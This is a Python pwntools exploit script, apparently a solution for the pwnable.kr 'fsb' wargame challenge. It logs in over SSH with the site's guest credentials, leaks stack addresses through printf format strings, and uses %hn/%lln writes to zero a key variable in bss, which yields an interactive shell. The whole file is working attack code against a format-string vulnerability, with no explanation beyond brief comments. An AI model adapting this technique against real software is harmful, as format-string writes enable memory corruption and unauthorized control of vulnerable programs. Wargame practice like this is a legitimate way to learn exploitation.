#!/usr/bin/python

#
# NOTE: This explot has very high probablility of working fine but it is not 100%
#
from pwn import *

s = ssh(host='pwnable.kr', port=2222, user='fsb', password='guest')
t = s.process('./fsb')

# printf episode #1 - leak
_ = t.recvuntil('Give me some format strings(1)\n')
t.sendline('%15$p %18$p')
s = t.recvline()[:-1].split()
arg21_addr = int(s[0][2:], 16)
far_stack_addr = int(s[1][2:], 16)

stack_ptr = far_stack_addr - 0x178 #0x8c <- local offset 
bss_ptr = stack_ptr + 0xc0 #0x60 <- local offset

stack_ptr_arg = 21 + ((stack_ptr - arg21_addr) / 4)
bss_ptr_arg = 21 + ((bss_ptr - arg21_addr) / 4)

# printf episode #2 - adjust bss stack
_ = t.recvuntil('Give me some format strings(2)\n')
key_bss_addr = 0x0804a060
t.sendline('%{}c%{}$hn'.format(key_bss_addr & 0xffff, stack_ptr_arg))

# printf episode #3 - override key
_ = t.recvuntil('Give me some format strings(3)\n')
t.sendline('%{}$lln'.format(bss_ptr_arg))

# printf episode #4 - don't need it actually
_ = t.recvuntil('Give me some format strings(4)\n')
t.sendline('pass')

# send our key
_ = t.recvuntil('key :')
t.sendline('0')

t.interactive();
